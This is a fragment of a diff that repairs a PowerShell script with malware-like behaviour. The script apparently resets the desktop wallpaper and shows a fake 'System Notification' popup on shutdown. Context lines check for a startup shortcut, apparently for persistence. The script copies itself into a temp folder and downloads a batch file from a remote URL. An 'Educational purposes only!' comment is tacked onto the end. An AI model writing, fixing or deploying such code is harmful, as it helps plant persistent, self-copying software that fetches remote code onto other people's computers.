@@ -96,8 +96,9 @@ try {
             Reset-Wallpaper
         }
         Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
-        Add-Type -AssemblyName PresentationFramework
-        [System.Windows.MessageBox]::Show("e", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
+            Add-Type -AssemblyName PresentationFramework
+            [System.Windows.MessageBox]::Show("e", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
+        }
     }
 } catch {
     Show-ErrorMessage "Error monitoring wallpaper changes: $_"
@@ -118,11 +119,14 @@ if (-not (Test-Path $startupShortcutPath)) {
 }
 
 if ($MyInvocation.MyCommand.Path -ne $scriptPath1) {
-    Copy-Item $MyInvocation.MyCommand.Path $scriptPath1 -ErrorAction Stop
-} catch {
-    Show-ErrorMessage "Failed to copy script to temp folder: $_"
+    try {
+        Copy-Item $MyInvocation.MyCommand.Path $scriptPath1 -ErrorAction Stop
+    } catch {
+        Show-ErrorMessage "Failed to copy script to temp folder: $_"
+    }
 }
 
 if (-not (Test-Path $batFilePath)) {
     DownloadFile $batchUrl $batFilePath
 }
+# Educational purposes only!
